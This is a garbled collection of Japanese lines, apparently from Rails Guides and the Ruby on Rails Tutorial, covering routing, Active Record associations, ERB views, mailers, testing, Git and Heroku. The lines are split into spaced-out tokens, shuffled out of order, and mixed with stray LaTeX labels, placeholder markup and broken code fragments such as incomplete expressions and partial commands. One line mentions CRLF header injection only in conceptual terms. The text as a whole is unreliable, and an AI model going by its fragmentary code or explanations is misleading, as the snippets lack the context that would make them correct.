*   関連 付け を 作成 する と 自動 的 に 追加 さ れ る メソッド の 使用 方法
= = = = = = = = = = = = =
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/keys▖rb ` で す 。
  <%=  f ▖ label  : name  %><br>
*   「 ` and `/`or ` 」 より も 「 `&&`/`||` 」 が 望まし い 。
*   Rails   4 ▖ 0 で は 、 URL プレフィックス で 指定 さ れ た アプリケーション に エンジン が マウント さ れ て い る 場合 に ` SCRIPT _ NAME ` が 正し く 入れ子 に な る よう に な り ま し た 。
ここ で は この ヘルパー モジュール が 存在 し て い な く て も 問題 は な い の で 、 この 定数 名 で 例外 が 発生 し て も 例外 と し て 扱 わ ず に 黙殺 する 必要 が あ り ま す 。
これ は リスト \ ref{ code : home_ page _ signup_link } で 使用 さ れ て い ま し た 。
    resources  : ads ,   as :  'periodical _ads '
|   GET        | /photos          |  photos# index       | images_ path          |
* `: inverse _of`
** `:table_name_with _un derscore ` を 指定 する と 、 たとえば Customer クラス の 主 キー は ` customer_ id ` に な り ま す
リスト \ ref{ code : home_view_erb_title }  は 、 \emph { ERB } と 呼 ば れ て い る 、 Ruby の 埋め込 み コード の 最初 の 例 で す
これ は リスト \ ref{ code : log _ in_function } で 使用 さ れ て い ま し た 。
エンジン が マウント さ れ て い る ルート パス に 移動 し た ら 、 記事 の 一覧 が 表示 さ れ る よう に し た い もの で す 。
` http://example ▖ com/main▖ js ` を 含め る に は 以下 の よう に し ま す 。
著者 の システム 上 の SQLite と Heroku 上 の Postgre SQL で 直接 実験 し て み た ところ 、 この 手順 は 実際 に 必要 で あ る こと が わか り ま し た 。
リスト \ ref{ code :flash_persistence_ test } を 元 に テスト を 作成 し 、 以下 の 操作 手順 を テスト で 記述 し て 確認 でき る よう に し ま す 。
    ren der   'new'
その よう な 場合 は 、 改めて 例外 を 発生 さ せ な く て は な り ま せ ん 。
多く の コンピュータ プログラム で は 、 以下 の よう に し て 変数 の 値 を 1 つ 増や す こと が でき ま す 。
Micropost モデル に 画像 を 追加 する
   git  : init
*   エンジン の 役割
   raise  e  unless e ▖ mis sing _ name ?  
memorization の スペル ミス \emph { で は な く } 、 それ を もじ っ た memoization   ( r が な い )   と い う 造語 で あ る こと に ご 注意 くださ い 。
####  タイム スタンプ
###  vendor/plugins
    database : blog_development
User の デフォルト fixture  ( { 2 } { 3 } { / 3 } { 3 } { 4 } RED { / 4 } { / 3 } { 3 } { / 3 }) { / 2 }
これ に よ っ て 生成 さ れ る ルーティング は 、 最初 の 例 と 完全 に 同じ で す 。
この コード は リスト \ ref{ code : raw _ home_view } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
これ に よ り 、 モデル の テスト は \ passing する よう に な り ま す 。
早速 、 \ kode {link\_to } メソッド の 2 番 目 の 引数 で 、 適切 な 名前 付き ルート を 使 っ て み ま しょ う 。
footer パーシャル に リンク を 追加 する
リファクタリング の 前 に は 必ず テスト を 書 き 、 エラー を 起こ し そう な コード や 、 特に 止ま っ て しま い そう な コード を 集中 的 に テスト する 。
    @user  =  user
異な る データ モデル 同士 の \emph { 関連 付け } は 、 Rails の 強力 な 機能 で す 。
{ 0 } 図 3 ▖ 2 { / 0 }   { 1 } \ href { http://local host : 3000 /static _ pages/home}{/static _ pages/home } に アクセス し た 結果 { / 1 }
s   =  sanitize ( user_ input ,  tags: tags ,   attributes: % w ( href title) )
説明 文 は 通常 の 英語 と し て 大 文字 で 始め 、 ピリオド で 終わ る こと 。
*  ` add_view_ paths`:   アプリケーション や railties や エンジン に あ る ` app/views ` へ の パス を ビュー ファイル へ の パス に 追加 し ま す 。
< a   href = " # "   data- background - color = " # 000099 "   data- text - color = " # FFFFFF " > Paint  it  blue </a>
  @ article   =   Article ▖find ( params [ : id ] )
# => <select   id= " people "   name = " people " ><option > David < /option ></select >
さらに Rails は 、 エラー ページ に あ る 、 \ kode {div } で 囲 ま れ た エラー CSS クラス \ kode {field_ with _errors } を 適用 し て い ま す 。
`: batch_ size ` オプション は 、 ( ブロック に 個別 に 渡 さ れ る 前 に )   1 回 の バッチ で 取り出 す レコード 数 を 指定 し ま す 。
Active   Record で は 、 データベース の テーブル で 使用 さ れ る カラム の 名前 に つ い て も 、 利用 目的 に 応 じ て ルール が あ り ま す 。
上 の よう に debugger を 差し込 ん だ 後 に   / users / 1   に アクセス し て み る と 、 Rails サーバ が \ kode { byebug } の プロンプト を 表示 する よう に な り ま す 。
   belongs_to  : customer ,   touch :  true
SafeErb は 、 外部 入力 さ れ た 文字 列 を エスケープ する よう 通知 し て くれ ま す 。
< li >`:file`: --  メール を ファイル と し て 保存 する ▟` config▖ action _mailer ▖file_settings ` で 設定 可能 ▟</ li >
NOTE : `atomic _write ` が 行な う chmod 操作 が 原因 で 、 書き込 み 対象 ファイル が ACL セット を 持 っ て い る とき に その ACL が 再 計算 / 変更 さ れ ま す 。
    Blorgh : : Engine ▖ routes▖draw   do
NOTE :   1 つ の アクション に ` GET ` リクエスト と ` POST ` リクエスト を 両方 ルーティング する と 、 セキュリティ に 影響 する 可能 性 が あ り ま す 。
これ を 行な う に は 以下 を 実行 し ま す 。
CC   ( カーボン コピー )   や BCC   ( ブラインド カーボン コピー )   アドレス を 指定 する 場合 に も 同じ 形式 を 使用 でき ま す ▟ それぞれ ` : cc ` キー と `: bcc ` キー を 使用 し ま す 。
ハッシュ の インデックス   ( \emph { キー } と 呼 ぶ の が 普通 で す )   は 、 通常 何 ら か の オブジェクト で す 。
#### time_zone_select
言い換え る と 、 \ kode {▖center } 冒頭 の ドット \ kode {▖} は 、 この ルール が クラス に 対 し て スタイル を 適用 する こと を 示 し て い ま す 。
プレフィックス を カスタマイズ する こと も でき ま す 。
以下 の コード は 、
それ と 同時 に 、 Git で branch 、 edit 、 commit 、 merge を 行 う 際 に お 勧め の ワーク フロー の 実例 を ご覧 いただ き ま す
ただし 、 オーバーライド を 行な う モデル メソッド は 使用 でき ま せ ん 。
実行 結果 を 図 \ ref { fig : password _ reset_form } に 示 し ま す 。
個人 的 に は 、 以下 の テスト 手順 が お 勧め で す 。
X - Runtime:   0 ▖ 0 14 2 9 7
これ を 適用 さ せ る に は 、 データベース で マイグレーション を 実行 し ま す 。
上 の よう に する こと で 、 GET   + `/ comments/new/preview ` の よう な パス が 認識 さ れ 、 ` Comments ` コントローラ の ` preview ` アクション に ルーティング さ れ ま す 。
例えば 、 アップロード さ れ た 画像 に 対 する 制限 が な い ため 、 もし ユーザー が 巨大 な ファイル を 上げ た り 、 無効 な ファイル を 上げ る と 問題 が 発生 し て しま い ま す 。
` app/views/blorgh/ comments/_ comment▖html ▖erb ` ファイル を 作成 し 、 以下 の 記述 を 追加 し ま す 。
この 動作 は 、 ス プラット 演算 子 を 使用 する 手法 に も 関連 し ま す 。
EXPLAIN を 実行 する
この ファイル を 、 HTML で フォーマット さ れ た メール テンプレート に し ま す 。
Rails で は 、 この シンプル な アクション に 関連 付け られ た ビュー が あ り 、 そこ で 情報 を 表示 でき る こと を 期待 し て い ま す 。
123456 78 ▖ 0 5 ▖ to_s(: delimited , separator : "  " )   # = >  12 , 345 ,67 8   0 5
ここ で は 、 以下 の よう に マイクロ ポスト 用 の ファクトリー の 定義 に user を 含め る だけ で 、 マイクロ ポスト に 関連 付け られ る ユーザー の こと が Factory   Girl に 伝わ り ま す 。
従来 は 、 メイラー クラス で メイラー メソッド を 呼び出 す と 、 該当 する インスタンス メソッド が 直接 実行 さ れ ま し た 。
続 い て 上 と 同様 に 、 \ kode {cookies } メソッド で ユーザー ID と 記憶 トークン の 永続 cookies を 作成 し ま す 。
たとえば 、 ` seconds_ since_ mid night ` メソッド が 返 す 秒数 が 実際 の 総量 と 合 わ な い 可能 性 が あ り ま す 。
  #< Client   id :   3 ,   first _ name :  " Filo " >
    ```erb
\emph { Ruby   on   Rails チュートリアル } は 最新 の Rails   4 を 使用 し て い ま す の で 、 Web 開発 の 最 前線 を 本書 で 学 ぶ こと が でき ま す 。
と な っ て しま い 、 ( ActiveRelationship モデル を 探 し て しま い )   Relationship モデル を 見つけ る こと が でき ま せ ん 。
インデックス 自体 は 一意 性 を 強制 し ま せ ん が 、 オプション で \ kode {unique :  true } を 指定 する こと で 強制 でき る よう に な り ま す 。
この 正規 表現 を 理解 する ため に 、 お 手頃 な サイズ に 分割 し て 表 \ ref{table: valid _email _ regex } に まとめ ま し た
*  `stylesheets` は 、 ジェネレータ で スタイル シート の フック を 行な う か どう か を 指定 し ま す 。
    User   add  some  examples to   (or   delete )
       create
    <th > Title</ th >
  @ article   =   Article▖ new( article _params )
実行 に 時間 の かか る 行 や 、 ボトルネック に な る 可能 性 の あ る 行 を この ブロック で 囲 み 、 実行 に かか っ た 時間 を 読み取 り ま す 。
この オプション の 値 は 範囲 で な けれ ば な り ま せ ん 。
コントローラ は 、 アプリケーション に 対 する 特定 の リクエスト を 受け取 っ て 処理 する の が 役割 で す 。
\ kode {rspec } コマンド は 、 テスト の たび に コマンドライン に 移動 し て 手動 で コマンド を 実行 し な けれ ば な ら な い 点 が 面倒 で す
これ と 同等 の SQL は 以下 の よう に な り ま す 。
そう い う わけ で 、 リモート リポジトリ は デフォルト で 非 公開 で あ る の が 望まし く 、 なるべく 安全 側 に 倒 し て お き た い と 考え ま す 。
マイグレーション ファイル 名 の 先頭 に は 、 それ が 生成 さ れ た 時間 の \emph { タイム スタンプ } が 追加 さ れ ま す 。
レコード が な い 場合 は ` create ` が 呼び出 さ れ ま す 。
アプリケーション を 一気 に 検査 する 自動 テスト が な い と 、 変更 点 を すべて 手動 で 確認 し な けれ ば な ら ず 膨大 な 時間 が かか っ て しま い ま す 。
この ガイド で は 、 Ruby   on   Rails   ( 以下   Rails )   を 初めて 設定 し て 実行 する まで を 解説 し ま す 。
  end
2 ▖ years▖ from _now
今度 は テスト スイート が   \ passing   する はず で す 。
マイクロ ポスト の index ページ   ( \ href { http://local host : 3000 / microposts}{/microposts} )
これ は リスト \ ref{ code :failing _ validates_name_test } で 使用 さ れ て い ま し た 。
   def  discount_cannot_be_greater_than_total_ value
もし 手頃 な トピック が あ れ ば 、 関連 する RailsCast を ウォッチ する こと で 、 時間 を 大幅 に 節約 でき る こと で しょ う 。
 *  application - wide  styles to this  file  and   they'll  appear  at  the top   of  the
  end
` : as ` オプション を 使用 する と 、 名前 付き ルーティング ヘルパー を 上書き し て 異な る 名前 を 使用 でき ま す 。
* * クエリ パラメータ 以外 に ファイル 名 に 違い の な い コンテンツ は 確実 に キャッシュ さ れ な い こと が あ る * *
Git リポジトリ を 初期 化 し て 最初 の コミット を 実行 し て お き ま す 。
配列 の インスタンス 名 に は " @ " 記号 が 含 ま れ ま す 。
     respond_to  do  | format |
Rails で は 、 こう い う 場合 に \emph {flash } と い う 特殊 な 変数 を 使用 でき ま す ▟ この 変数 は ハッシュ の よう に 扱 う こと が でき ま す 。
###  URL を 実際 の コード に 割り振 る
` w here ` は 、 関連 付け られ る オブジェクト が 満た す べ き 条件 を 指定 し ま す 。
TIP :   現在 と 同じ コントローラ の アクション に リンク する 場合 は 、 ` controller ` の 指定 は 不要 で す ▟ デフォルト で は 現在 の コントローラ が 使用 さ れ る から で す 。
Git   で バージョン 管理 を し て い る 場合 は 、 次 の コマンド で トピック ブランチ を 作成 し て くださ い 。
<%=   link_to  ' Ad   details ' ,  url_ for ( [@magazine ,  @ad ] )  %>
##### `: layout ` オプション
最初 に 、 Sessions コントローラ と \ kode {new } アクション を 生成 し ま す 。
- 134 ▖ordinalize # =>  " - 134 th "
http://mycdnsubdomain▖fictional - cdn▖ com/assets/smile▖ png
次 の 段階 と し て 、 `Object ` に 対 する すべて の 拡張 機能 を 単に 読み込 ん で み ま しょ う 。
Time▖ local ( 2000 ,   5 ,   31 ) ▖ prev_quarter   # =>  Tue ,   29   Feb   2000
╼╼    \ subsection { [ フォロー する ]   ボタン   ( 標準 的 な 方法 ) } %  ( fold) ╼    \ label{ sec :a_working _ follow_button_the_standard _way } ╼╼
デフォルト の 設定 と は 異な り 、 WEBrick を 使用 し て アプリケーション を production モード で 実行 し たり ( これ は 絶対 に や ら な い で くださ い ) テスト する 場合 は true に 設定 さ れ ま す 。
DOCTYPE  html >
#   gem ' libnotify' ,   ' 0 ▖ 8 ▖ 0 '
\ kode { Gemfile } に Factory   Girl を 追加 する 。
ここ で は 、 \ kode { home } アクション の 中身 は 空 な の で \ kode {nil } が 返 さ れ ま す 。
エラー ページ など 、 一般 ( Web ブラウザ など ) に 直接 公開 する データ
たとえば 、 サンプル アプリケーション \ kode { production ▖rb } の 設定 ファイル は 以下 の よう に 表 し ま す
    </ head >
最後 に 、 三 項 演算 子 を 関数 の 戻 り 値 と し て 使用 する こと も よく あ り ま す 。
` : layout ` オプション を 指定 する と 、 現在 の アクション に 対 し て 特定 の ファイル を レイアウト と し て 使用 し ま す 。
アカウント 有効 化 の テキスト ビュー
関連 付け で 強制 的 に 一意 に な る よう に する ため に ` include ? ` を 使用 し な い で くださ い 。
ステータス フィード の パーシャル は 以下 の コード を 使 う と い う 点 で 、 フィード アイテム の パーシャル に 表示 さ れ る フィード アイテム と 異な り ま す 。
非 推奨 警告 が 表示 さ れ な い よう に する に は 、 test 環境 に 以下 の 記述 を 追加 し ま す 。
# => < text area   cols = " 20 "   rows = " 30 "   id= " comment_ text "   name =" comment [ text ] " >
ユーザー の \ kode {microposts } 属性 に 対 する テスト 。
バグ を 再現 する ため に 有用 な 情報 を 追加 し たり 、 不要 な 手順 を 削除 し たり する の も 重要 な 貢献 で す 。
  => " test "
アセット パイプライン の 第 3 の 機能 は 、 より 高級 な 言語 を 使用 し た コーディング の サポート で す ▟ これ ら の 言語 で 記述 さ れ た コード は プリ コンパイル さ れ 、 実際 の アセット に な り ま す 。
       exist       app/views/microposts
*   Rails   4 ▖ 0 で ルーティング に ` match ` を 使用 する 場合 は 、 リクエスト メソッド の 指定 が 必須 と な り ま し た 。
メール の 正規 表現 を 分解 し た 結果
サイド バー の マイクロ ポスト カウント の テスト を 追加 し て くださ い ▟ この とき 、 表示 に 単数 形 と 複数 形 が 正し く 表示 さ れ て い る か どう か も テスト し て くださ い 。
self を 省略 し た 結果 を リスト \ ref{ code : users _fixtures _extra_users } に 示 し ま す 。
 * = require_tree   ▖
セキュリティ モデル を 確認 する ため に before フィルター を コメント アウト する
` XmlHttpRequest ` を 明示 的 に テスト し て くださ い 。
Spork 向け に 更新 し た \ kode { Guardfile } 。
#### ` test ` ディレクトリ
orders▖ w here ( ▖▖▖)
ここ で 、 users\_ path に POST リクエスト を 送信 する ため に 、 \ kode { post \_ via\_redirect } と い う メソッド を 使 っ て い る こと に 注目 し て くださ い 。
[ Settings ]   リンク の テスト を 追加 する 。
テスト は 最初 は 赤色   ( 失敗 ) 、 次 に 緑色   ( 成功 )   に な る よう に し て くださ い
仮想 の \ kode { password } 属性 は \ kode { has\_ secure\ _ password } メソッド で 自動 的 に 作成 でき ま し た が 、 今回 は \ kode {remember\_token } の コード を 自分 で 書 く 必要 が あ り ま す 。
####  number_ with_ delimiter
Rails は 、 データ ストア の 詳細 から ほぼ 完全 に 私 たち を 切り離 し て くれ ま す 。
アカウント 有効 化 リンク を メール 送信 する
テスト スイート は 期待 どおり パス ( \ passing )   し ま す
< li >`: test `: --  メール を 配列 ` Action Mailer : : Base ▖ deliveries ` に 保存 する ▟</ li >
テーブル に 含 ま れ る フィールド の 最大 値 を 得 る に は 、 その テーブル を 持 つ クラス に 対 し て ` maximum ` メソッド を 呼び出 し ま す 。
$   sqlite 3   - - version
以上 で お しまい で す 。
  >>   5 ▖ megabytes
モデル 注釈
#   現在 の ユーザー を ログ アウト する
パスワード を 簡単 に 当て られ な い よう に する ため に 、 パスワード の 最小 文字 数 を 設定 し て お く こと は 一般 に 実用 的 で す 。
C ▖ subclasses # => [ ]
http://www▖cbsnews▖ com/stories/2002 / 0 2 / 15 /weather_ local /main5016 44 ▖shtml ? zipcode = 1 -- >
create_customer
以後 、 本 ガイド で は 基本 的 に この ディレクトリ を 中心 に 説明 を 行 い ま す 。
これ で 、 すべて の テスト が \ passing する はず で す 。
移動 先 の ページ で フラッシュ メッセージ が 表示 \ emph { さ れ て い な い } こと を 確認 する
  #  残り すべて の ルーティング
####  label_tag
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
この セクション の コード で は 、 \ href { http://github▖ com/thoughtbot/ clearance } { thoughtbot } 社 が 提供 する \ href { http://thoughtbot▖ com/}{ Clearance }   gem を 適用 し て い ま す 。
( \ ref{ sec :uniqueness_validation } で 、 マイグレーション を 一 から 手動 で 作成 する 方法 に つ い て 説明 し ま す 。
` prev_month ` は ` last _month ` の 別名 で す 。
= >   [ 42 ,   8 ,   17 ]
###  旧 バージョン の Ruby   on   Rails
パスワード と パスワード の 確認 が 一致 する か どう か も テスト する 必要 が あ り ま す 。
    <%=  f ▖ label  : body %><br>
#  Bundle edge  Rails   instead :
プログラミング 経験 の な い 方 は 多少 苦労 する こと も あ る と 思 い ま す が 、 どう か 諦め ず に 頑張 っ て くださ い 。
トップ レベル の 見出し   ( \kode {< h 1 >} )   が \ kode {Sample  App } に 変更 さ れ た ため 、 上 の コード は テスト に パス し ま す 。
リスト \ ref{ code : validate_picture_ format } や リスト \ ref{ code :micropost _model_ image_validation } で 定義 し た 画像 の バリデーション を ビュー に 組み込 む ため に 、 クライアント 側 に 2 つ の 処理 を 追加 し ま しょ う 。
この チェック は 、 `email_confirmation ` が `nil ` で な い 場合 のみ 実施 さ れ ま す 。
Rails で は 、 データベース の テーブル 名 を 見つけ る とき に 、 モデル の クラス 名 を 複数 形 に し た もの を 使用 し ま す 。
{ 0 } 図 7 ▖ 20 { / 0 } { 1 } ユーザー 登録 が 成功 し 、 フラッシュ メッセージ が 表示 さ れ る ▟ \ href { http://railstutorial ▖org / images/figures/signup_flash_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
    <p >
###  Unicode 文字 列 を ルーティング で 使用 する
create    app/assets/stylesheets/scaffold▖css
now ▖all_month
* `: layout `
` prev_month ` および ` next _ month ` と 基本 的 に 同じ 要領 で 動作 し ま す 。
       create      app/views/microposts/_form ▖html ▖erb
config▖ action _mailer▖ raise_ delivery _errors  =  true
create_account !
`<%=   javascript_ include_tag   params [ : controller ]  %>`  また は  `<%= stylesheet_link_tag   params [ : controller ]  %>`
    resources  : articles
###  ラッピング
現在 の Rails の ビュー で は 、 安全 で な い 値 は 自動 的 に エスケープ さ れ る ため で す 。
xml ▖div  {
最初 は 、 Git に 付属 する \ kode {mv } コマンド   ( 注 :  Unix の mv コマンド で は あ り ま せ ん ! )   を 使 っ て README の 拡張 子 を 変更 し ま す 。
メイラー も 同様 に 名前 空間 化 さ れ ま す 。
#### ` auto_discovery _ link_tag ` を 使用 し て フィード に リンク する
Bitbucket に 最初 の アプリ の リポジトリ を 作成 する 。
|   ファイル / フォルダ   |   目的   |
図 \ ref { fig: login_ page _protected_mockup } の よう に 転送 さ せ る 仕組み を 実装 し た い とき は 、 Users コントローラ の 中 で \emph {before フィルター } を 使 い ま す 。
シンプル な テキスト エディタ 「 \ kode {nano} 」 を 使 っ て 、 ホーム ディレクトリ に 「   \kode { ▖irbrc} 」 ファイル を 作 っ て み ま しょ う   ( リスト \ ref{ code :irbrc} ) 。
form _ for
<% =  ren der @ article ▖ comments %>
つまり 、  _ ヘッダー インジェクション に おけ る 攻撃 方法 は 、 ヘッダー に CRLF 文字 を 注入 する と い う もの な の で す 。
Home ページ 用 に 生成 さ れ た ビュー
( これ は \ ref{ sec : edit_ form } で 実現 し ま す ) 。
ファイル 名
ブラウザ 関連 の ミドルウェア を 削除 する に は 次 の よう に 書 き ま す 。
{ 0 } 図 2 ▖ 6   { / 0 } { 1 } ユーザー 表示 用 の ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 1 }{ / users / 1 }) { / 1 }
リスト \ ref{ code : logo_css } の CSS は 、 テキスト を 大 文字 に 変換 し 、 サイズ 、 色 、 配置 を 変更 し ま す
サンプル アプリケーション の テスト は 既に 完了 し て い る の で 、 Web サイト の 機能 を 損な う こと な く 安心 し て リファクタリング に 取りかかれ ま す 。
これ は リスト \ ref{ code : sign_in_function } で 使用 さ れ て い ま し た 。
この 時点 で は 、 テスト は   \ passing   に な る はず で す 。
<% = stylesheet_link_tag   " application " ,   debug :   true   %>
[ ` form_tag ` ] ( http://api▖ rubyonrails ▖org / classes / ActionView/ Helpers/Form TagHelper▖html # method - i - form_tag )   は ` form _ for ` と よく 似 て い ま す 。
同様 に 、 ` all _week` 、 `all_month` 、 `all_quarter ` 、 `all_ year ` も 時間 の 範囲 を 生成 でき ま す 。
` app/assets/javascripts ` に 置 か れ て い る Java Script アセット へ の URL を 算出 し ま す 。
あるいは 「 悪 い けど それ は 採用 でき そう に な い ね 」 と い う 返信 か も しれ ま せ ん 。
これ だけ で も かなり の 量 で す が 、 Rails に つ い て 学 ぶ べ き こと は まだまだ たくさん あ り ま す 。
最初 の 行 で は 、 Home ページ に 対 する テスト で あ る こと を 記述 し て い ま す 。
この コード は リスト \ ref{ code :help_view_ full _html } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
     content_type:  " text /plain " ,
サーバー ログ に 表示 さ れ た アカウント 有効 化 メール の 例
たとえば 、 Gemfile に 以下 の よう な 記述 が あ る と し ま す 。
たとえば 、 自分 の アプリケーション で 、 すべて の ユーザー に は 必ず 電子 メール アドレス と メーリング リスト アドレス が 必要 だ と し ま す 。
RubyGems の インストール
Heroku 上 で 動作 し て い る Rails チュートリアル の 最初 の アプリケーション ▟ \ href { http://railstutorial ▖org / images/figures/heroku_app _ 4 _ 0 - full ▖ png } { ( フル サイズ ) }
その 他 の 点 は ` form _ for ` と 同じ で す 。
time_range   = ( Time▖now ▖ mid night  -   1 ▖ day ) ▖ ▖
上 の コード を 実行 する と 、 以下 の よう な SQL が 生成 さ れ ま す 。
    ```html +erb
@ document ▖ paragraphs
( Home ページ の 統計 情報 は 別 の テスト に し て み ま せ ん か ▟ )
これ は リスト \ ref{ code :micropost_dependency _ test } で 使用 さ れ て い ま し た 。
コントローラ レベル で 指定 さ れ た レイアウト で は 、 ` : only ` オプション と ` : except ` オプション が サポート さ れ て い ま す 。
ログ インフォーム は 、 ユーザー が ログ イン する ため の 新し い セッション を 作成 する よう に 設計 さ れ て い ま す 。
詳し く は 、 Heroku の \ href {https://devcenter ▖ heroku▖ com/articles/error - pages } { エラー に 関 する ページ }   ( 英語 )   に あ る ドキュメント を 参照 し て くださ い 。
ユーザー が ログ アウト でき る よう に する ため に 、 ユーザー を 記憶 する ため の メソッド と 同様 の 方法 で 、 ユーザー を 忘れ る ため の メソッド を 定義 し ま す 。
これ ら の 概念 に つ い て も 、 この 章 で すべて 説明 し ま す 。
*  `stylesheet_engine ` は 、 アセット 生成 時 に 使用 さ れ る 、 sass など の スタイル シート エンジン を 指定 し ま す 。
Unknown  action   new  for   Articles Controller ! ] (
これ は リスト \ ref{ code : name_title_and _heading } で 使用 さ れ て い ま し た 。
{ 0 } リスト 2 ▖ 5 { / 0 } ╼╼ { 1 } Toy アプリケーション の 簡潔 な ユーザー \ kode {index } アクション { 3 } { / 3 }   { 4 } app/controllers/users_controller▖ rb { / 4 } { / 1 }
最初 の Sessions コントローラ 。
これ は リスト \ ref{ code :flash_test } で 使用 さ れ て い ま し た 。
1 つ の イベント で 複数 の コール バック を 使用 し た い 場合 に は 、 配列 を 使用 し て 渡 し ま す 。
NOTE : `belongs_to ` 関連 付け で 指定 する モデル 名 は 必ず 「 単数 形 」 に し な けれ ば な り ま せ ん 。
 * = require_tree   ▖
最初 に 、 パーシャル を 定義 する と レイアウト が どの よう に 変わ る か を 見 て み ま しょ う   ( リスト \ ref{ code : layout_with _ partials } ) 。
" 0  microposts "
この コード に は \ kode { password_digest } 属性 の 検証 も 含 ま れ ま す ▟ )
通常 、 これ ら の アクション は 、 ページ を 出力 せ ず に データベース 上 の ユーザー 情報 を 操作 し ま す   ( もちろん ページ を 出力 し よう と 思 え ば でき ま す が ) 。
* `: polymorphic `
Strong   Parameters を 使 う こと で 、 安全 に Web 上 から 更新 さ せ る こと が でき る
` with _options ` ブロック の 内側 に あ る すべて の バリデーション に は 、 ` if: : is_ admin ? ` と い う 条件 が 渡 さ れ ま す 。
この ヘルパー の デフォルト メッセージ は  _" doesn't  match  confirmation " _  で す 。
d   =  Date▖ new (2012 ,   9 ,   16 )      # =>  Sun ,   16   Sep  2012
production 環境 の 場合
これ に よ り 、 モデル は 以下 の よう に な り ま す 。
その 理由 を 考え て み て くださ い 。
オブジェクト が 本当 に 削除 さ れ た か どう か を どの よう に し て 知 れ ば よ い で しょ う か 。
   - >   0 ▖ 0 0 1 9 s
これ は リスト \ ref{ code :successful_edit_test } で 使用 さ れ て い ま し た 。
これ で 、 ユーザー 有効 化 機能 の おおまか な 部分 に つ い て は 実装 でき ま し た
ユーザー 登録 後 に サイン アップ する 。
### `find_or_ initialize_by `
今回 の StaticPages コントローラ に あ る メソッド は 、 以下 の よう に どちら も 最初 は 空 に な っ て い ま す 。
簡単 な Rails アプリケーション を 例 に と っ て 説明 し ま しょ う ▟ この アプリケーション に は 顧客 用 の モデル ( Customer ) と 注文 用 の モデル ( Order ) が あ り ま す 。
       layout   false
この 節 で は 、 一人ぼっち の ユーザー に 仲間 を 加え て あげ る こと に し ま す 。
  <%=   submit_tag  %>
この 時点 で 、 すべて の テスト が パス する はず で す 。
与え られ た パス が 認識 可能 で あ る こと 、 アプリケーション の 特定 の 場所 に ルーティング さ れ る こと を テスト する アサーション で す 。
### `rails server `
####   重要 な ファイル
テスト 駆動 開発 用 に \ kode { has_ secure_ password } を コメント アウト する 。
  #< Client   id :   220 ,   first _ name :  " Sara " >
   var  =  boolean ?   ?
###  CacheHelper
` create_association ` メソッド は 、 関連 付け られ た 型 の 新し い オブジェクト を 返 し ま す 。
This
サイン イン フィーチャー が パス する ため の 完全 な ステップ 定義 。
この 章 で は 、 Rails の 強力 な 機能 を いく つ か 紹介 する ため の おもちゃ アプリケーション を 作成 し ま す 。
この メソッド 呼び出し は 以下 の よう な もの に な り ま す 。
上 を ` Client ` モデル に 追加 し た と し ま す 。
プリ コンパイル の 対象 と な る アセット は ` engine ▖rb ` で 定義 でき ま す 。
これ に よ り 、 ` config/initializers/wrap_parameters▖rb ` ファイル の 以下 の オプション を コメント アウト し たり 削除 し たり でき る よう に な り ま し た 。
たとえば 、 \ kode { 引数 } を 1 つ 取 り 、 引数 が 空 か どう か に 基づ い た メッセージ を 返 す \emph {string _ message } と い う 関数 を 定義 し て み ま しょ う 。
self を 省略 し た 結果 を リスト \ ref{ code : first _migration } に 示 し ま す 。
{ 0 } 図 3 ▖ 11   { / 0 } { 1 } 隠れ て い る \ kode {▖ gitignore } ファイル を 表示 する { / 1 }
`yield ` を 呼び出 す 代わり に 、 パーシャル レイアウト 内 に あ る コード の ブロック を 出力 する こと も でき ま す 。
    @url  =  user_url( @user )
client  =  Client ▖ readonly▖ first
ボタン を サイン アップ ページ に リンク する 。
*  `config▖ mid dleware ▖ use ( new_ mid dleware ,  args) ` -   ミドルウェアスタック の 一番 下 に 新し い ミドルウェア を 追加 し ま す 。
* `: delete ` を 指定 する と 、 関連 付け られ た オブジェクト は データベース から 直接 削除 さ れ ま す ▟ この とき コール バック は 実行 さ れ ま せ ん 。
以下 の コマンド で 、 RDoc の 出力 を 手軽 に 確認 でき ま す 。
ビルト イン メソッド と 一貫 さ せ る ため 、 相対 パス 以外 は 利用 でき ま せ ん 。
あるいは ヘッダー を 除去 する こと も でき ま す 。
これ は リスト \ ref{ code :edit _update_wrong _user_tests } で 使用 さ れ て い ま し た 。
( 前述 の とおり 、 3 番 目 の 場合 に つ い て は 演習 に 回 し ま す ) 。
演習 の 解答 が 少な い 分 、 本編 で 解答 を 示 す よう に し て い ま す 。
#   Declares  an   attribute   reader  backed  by  an  internally- named
#   追加 の アセット を プリ コンパイル する   ( application ▖js 、 application ▖css 、 および すべて の
最初 に 、 特定 記事 の コメント を すべて 表示 する 部分 を 切り出 し て コメント パーシャル を 作成 し ま しょ う 。
重複 を 取り除 く テクニック の ひと つ と し て 、 ビュー で 「 \emph { 埋め込 み Ruby } 」 ( Embedded  Ruby )   を 使用 でき ま す 。
Invoice ▖ find_ in_batches  do  | invoices |
この コード は リスト \ ref{ code :index_ final _ refactoring } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
なお 、 OS   X で あ れ ば   \ kode { brew install  imagemagick }   で イン ストール でき ま す   ( \ href { http://brew▖sh/}{ Homebrew } が インストール さ れ て い な けれ ば インストール し て くださ い ) 。
        has _one   : account
#   For   APIs,   you   may  want  to  use  :null_session   instead ▖
//= require   library _ name
*  `collection▖build ( attributes = {}, ▖▖▖)
` News Controller ` に よ っ て 生成 さ れ る ページ で は 、 トップ メニュー を 隠 し て 右 メニュー を 追加 し た い と し ま す 。
{ 0 } リスト 2 ▖ 12 { / 0 } ╼╼ { 1 } 1 つ の マイクロ ポスト は 1人 の ユーザー に のみ 属 する ▟ { 2 } { / 2 }   { 3 } app/models/micropost ▖ rb { / 3} { / 1 }
Date▖ new (2000 ,   5 ,   31 ) ▖ prev_month # =>  Sun ,   30   Apr  2000
この 章 に は 多く の 話題 が 盛り込 ま れ て い ま す が 、 一 度 読 ん だ だけ で 理解 する 必要 は まったく あ り ま せ ん 。
d ╼\end{ code }╼\end{ codelisting } ╼╼      %  subsection   format_validation   ( end ) ╼╼    \ subsection { 一意 性 を 検証 する } %  ( fold) ╼    \ label{ sec :uniqueness_validation}╼╼
###  平均
Home ページ を ルート URL に 設定 する
